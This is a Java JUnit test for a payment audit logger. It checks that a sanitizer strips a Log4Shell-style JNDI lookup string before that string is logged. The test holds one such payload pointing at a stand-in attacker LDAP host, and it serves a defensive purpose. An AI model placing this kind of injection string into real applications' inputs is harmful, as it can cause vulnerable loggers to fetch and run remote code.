package com.payments.service;

import org.junit.jupiter.api.Test;
import static org.junit.jupiter.api.Assertions.*;

public class PaymentAuditLoggerTest {
    @Test
    public void testNeutralizeJndiExploitString() {
        String exploitPayload = "${jndi:ldap://malicious-attacker.com/exploit}";
        String sanitized = PaymentAuditLogger.sanitizeLogContext(exploitPayload);
        assertFalse(sanitized.contains("${jndi"));
        PaymentAuditLogger logger = new PaymentAuditLogger();
        assertDoesNotThrow(() -> logger.logTransaction(sanitized));
    }
}
